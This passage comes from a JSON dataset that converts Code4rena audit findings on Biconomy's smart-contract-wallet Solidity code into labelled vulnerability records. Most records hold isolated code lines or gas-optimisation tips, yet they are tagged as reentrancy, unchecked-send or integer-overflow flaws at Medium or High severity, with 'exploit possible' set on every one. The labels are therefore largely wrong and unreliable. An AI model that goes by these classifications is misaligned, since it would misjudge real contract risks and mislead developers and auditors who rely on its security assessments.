\"@openzeppelin/contracts/utils/Address.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::36 => require(address(_entryPoint) != address(0), \"VerifyingPaymaster: Entrypoint can not be zero address\");\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::37 => require(_verifyingSigner != address(0), \"VerifyingPaymaster: signer of paymaster can not be zero address\");\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::42 => revert(\"Deposit must be for a paymasterId. Use depositFor\");\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::49 => require(!Address.isContract(paymasterId), \"Paymaster Id can not be smart contract address\");\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::50 => require(paymasterId != address(0), \"Paymaster Id can not be zero address\");\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::66 => require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::106 => // we only \"require\" it here so that the revert reason on invalid signature will be of \"VerifyingPaymaster\", and not \"ECDSA\"\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::107 => require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::108 => require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), \"VerifyingPaymaster: wrong signature\");scw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::109 => require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], \"Insufficient balance for paymaster id\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::8 => import \"@account-abstraction/contracts/interfaces/IAccount.sol\"; scw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::9 => import \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\"; scw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::10 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1, and is validated in the constructor */ scw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1)); scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::5 => import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 37,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::198 => // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8);\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::97 => function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::198 => // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4 scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4] scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8; scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8); scw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::97 => function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.751,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::12 => struct Transaction {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::145 => struct MemoryUserOp {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::12 => struct Transaction { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::145 => struct MemoryUserOp {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.2,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::20 => function setupModules(address to, bytes memory data) internal {\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::32 => function enableModule(address module) public authorized {\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::47 => function disableModule(address prevModule, address module) public authorized {\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::55 => function withdrawTo(address payable withdrawAddress, uint256 amount) public override {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::20 => function setupModules(address to, bytes memory data) internal { scw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::32 => function enableModule(address module) public authorized { scw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::47 => function disableModule(address prevModule, address module) public authorized { scw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::55 => function withdrawTo(address payable withdrawAddress, uint256 amount) public override {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.633,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::33 => address public verifyingSigner;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::33 => address public verifyingSigner;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.149,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::36 => string public constant VERSION = \"1.0.2\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccountFactory.sol::11 => string public constant VERSION = \"1.0.2\";\nscw-contracts\\contracts\\smart-contract-wallet\\handler\\DefaultCallbackHandler.sol::!2 => string public constant NAME = \"Default Callback Handler\";\nscw-contracts\\contracts\\smart-contract-wallet\\handler\\DefaultCallbackHandler.sol::13 => string public constant VERSION = \"1.0.0\";\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::36 => string public constant VERSION = \"1.0.2\"; scw-contracts\\contracts\\smart-contract-wallet\\SmartAccountFactory.sol::11 => string public constant VERSION = \"1.0.2\"; scw-contracts\\contracts\\smart-contract-wallet\\handler\\DefaultCallbackHandler.sol::!2 => string public constant NAME = \"Default Callback Handler\"; scw-contracts\\contracts\\smart-contract-wallet\\handler\\DefaultCallbackHandler.sol::13 => string public constant VERSION = \"1.0.0\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.512,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccountFactory.sol\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol\nscw-contracts\\contracts\\smart-contract-wallet\\libs\\MultiSend.sol\nscw-contracts\\contracts\\smart-contract-wallet\\libs\\MultiSendCallOnly.sol\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Findings:",
    "description": "Following files: scw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol scw-contracts\\contracts\\smart-contract-wallet\\SmartAccountFactory.sol scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.667,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::136 => return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::143 => abi.encode(\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::197 => return keccak256(abi.encode(userOp.hash(), address(this), block.chainid));\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\PaymasterHelpers.sol::28 => return abi.encode(data.paymasterId);\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::80 => return keccak256(abi.encode(\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::136 => return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this)); scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::143 => abi.encode( scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::197 => return keccak256(abi.encode(userOp.hash(), address(this), block.chainid)); scw-contracts\\contracts\\smart-contract-wallet\\paymasters\\PaymasterHelpers.sol::28 => return abi.encode(data.paymasterId); scw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::80 => return keccak256(abi.encode(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.656,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::88 => modifier onlyEntryPoint {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::88 => modifier onlyEntryPoint {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.097,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::507 => internal override virtual returns (uint256 deadline) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::168 => function innerHandleOp(bytes calldata callData, UserOpInfo memory opInfo, bytes calldata context) external returns (uint256 actualGasCost) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::18 => function getDepositInfo(address account) public view returns (DepositInfo memory info) {\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\PaymasterHelpers.sol::27 => ) internal pure returns (bytes memory context) {\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::98 => external view override returns (bytes memory context, uint256 deadline) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::507 => internal override virtual returns (uint256 deadline) { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::168 => function innerHandleOp(bytes calldata callData, UserOpInfo memory opInfo, bytes calldata context) external returns (uint256 actualGasCost) { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::18 => function getDepositInfo(address account) public view returns (DepositInfo memory info) { scw-contracts\\contracts\\smart-contract-wallet\\paymasters\\PaymasterHelpers.sol::27 => ) internal pure returns (bytes memory context) { scw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::98 => external view override returns (bytes memory context, uint256 deadline) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.846,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n[scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L68](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L68)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings``",
    "description": "[scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L68](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L68) 68:    require(msg.sender != SENTINEL_MODULES && modules[msg.sender] != address(0), \"BSA104\"); [scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L34](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L34) 34:    require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\"); [scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L49](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L49)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.21,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n[scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol#L47](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol#L47)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings",
    "description": "[scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L486](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L486) 486:    uint256 maxFeePerGas = mUserOp.maxFeePerGas; [scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol#L47](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol#L47) 47:    uint256 maxFeePerGas = userOp.maxFeePerGas;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.238,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol\n\n203:      function _copyUserOpToMemory(UserOperation calldata userOp, MemoryUserOp memory mUserOp) internal pure {\n\n248:      function _getRequiredPrefund(MemoryUserOp memory mUserOp) internal view returns (uint256 requiredPrefund) {\n\n261:      function _createSenderIfNeeded(uint256 opIndex, UserOpInfo memory opInfo, bytes calldata initCode) internal {\n\n289       function _validateAccountPrepayment(uint256 opIndex, UserOperation calldata op, UserOpInfo memory opInfo, address aggregator, uint256 requiredPrefund)\n290:      internal returns (uint256 gasUsedByValidateAccountPrepayment, address actualAggregator, uint256 deadline) {\n\n349:      function _validatePaymasterPrepayment(uint256 opIndex, UserOperation calldata op, UserOpInfo memory opInfo, uint256 requiredPreFund, uint256 gasUsedByValidateAccountPrepayment) internal returns (bytes memory context, uint256 deadline) {\n\n496:      function min(uint256 a, uint256 b) internal pure returns (uint256) {\n\n500:      function getOffsetOfMemoryBytes(bytes memory data) internal pure returns (uint256 offset) {\n\n504:      function getMemoryBytesFromOffset(uint256 offset) internal pure returns (bytes memory data) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[G&#x2011;01]  `internal` functions only called once can be inlined to save gas",
    "description": "Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls. *There are 9 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 203:      function _copyUserOpToMemory(UserOperation calldata userOp, MemoryUserOp memory mUserOp) internal pure { 248:      function _getRequiredPrefund(MemoryUserOp memory mUserOp) internal view returns (uint256 requiredPrefund) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 21,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol\n\n/// @audit require() on line 353\n354:          uint256 gas = verificationGasLimit - gasUsedByValidateAccountPrepayment;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "[G&#x2011;02]  Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement",
    "description": "`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }` *There are 2 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol /// @audit require() on line 353 354:          uint256 gas = verificationGasLimit - gasUsedByValidateAccountPrepayment;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.211,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol\n\n100:          for (uint256 i = 0; i < opasLen; i++) {\n\n107:          for (uint256 a = 0; a < opasLen; a++) {\n\n112:              for (uint256 i = 0; i < opslen; i++) {\n\n128:          for (uint256 a = 0; a < opasLen; a++) {\n\n134:              for (uint256 i = 0; i < opslen; i++) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "High",
    "title": "[G&#x2011;03]  `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops",
    "description": "The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)** *There are 5 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 100:          for (uint256 i = 0; i < opasLen; i++) { 107:          for (uint256 a = 0; a < opasLen; a++) {",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.371,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n\n42:           revert(\"Deposit must be for a paymasterId. Use depositFor\");\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "[G&#x2011;04]  `require()`/`revert()` strings longer than 32 bytes cost extra gas",
    "description": "Each extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas** *There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol 42:           revert(\"Deposit must be for a paymasterId. Use depositFor\"); https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L42",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.201,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol\n\n13:           assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[G&#x2011;05]  `keccak256()` should only need to be called on a specific string literal once",
    "description": "It should be saved to an immutable variable, and the variable used instead. If the hash is being used as a part of a function selector, the cast to `bytes4` should also only be done once *There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol 13:           assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1)); https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol#L13",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.2,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n/// @audit setOwner(), updateImplementation(), updateEntryPoint(), domainSeparator(), getChainId(), getNonce(), handlePaymentRevert(), checkSignatures(), requiredTxGas(), getTransactionHash(), encodeTransactionData(), transfer(), pullTokens(), execute(), executeBatch(), execFromEntryPoint(), getDeposit(), addDeposit(), withdrawDepositTo()\n18:   contract SmartAccount is \n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[G&#x2011;06]  Optimize names to save gas",
    "description": "`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92) *There are 21 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol /// @audit handleOps(), handleAggregatedOps(), innerHandleOp(), getUserOpHash(), simulateValidation(), getSenderAddress() 21:   contract EntryPoint is IEntryPoint, StakeManager {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.453,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/libs/Math.sol\n\n20:           return a > b ? a : b;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[G&#x2011;07]  `>=` costs less gas than `>`",
    "description": "The compiler uses opcodes `GT` and `ISZERO` for solidity code that uses `>`, but only requires `LT` for `>=`, [which saves **3 gas**](https://gist.github.com/IllIllI000/3dc79d25acccfa16dee4e83ffdc6ffde) *There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/libs/Math.sol 20:           return a > b ? a : b; https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L20",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.113,
    "vulnerability_types": [
      0,
      0,
      0,
